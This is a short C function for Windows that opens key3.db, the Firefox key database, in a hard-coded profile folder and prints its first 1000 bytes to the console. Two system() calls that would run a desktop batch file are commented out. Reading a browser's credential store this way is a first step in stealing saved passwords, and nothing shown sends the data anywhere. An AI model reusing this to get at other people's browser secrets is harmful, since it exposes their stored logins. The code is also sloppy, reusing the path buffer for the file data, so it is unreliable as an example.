#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void fileLocator()
{
    int i;
    FILE* file;

    char* buffer=(char*)malloc(10000);

    GetEnvironmentVariable("APPDATA",buffer,10000);
    buffer=strcat(buffer,"\\Mozilla\\Firefox\\Profiles\\bcvnf4p0.default\\key3.db");

    file=fopen(buffer,"r");
    fread(buffer,1000,1,file);
    for(i=0;i<1000;i++) printf("%c",buffer[i]);
    //system("C:\\Users\\xuzizhang\\Desktop\\demo.bat");
    //system("explorer .");
}
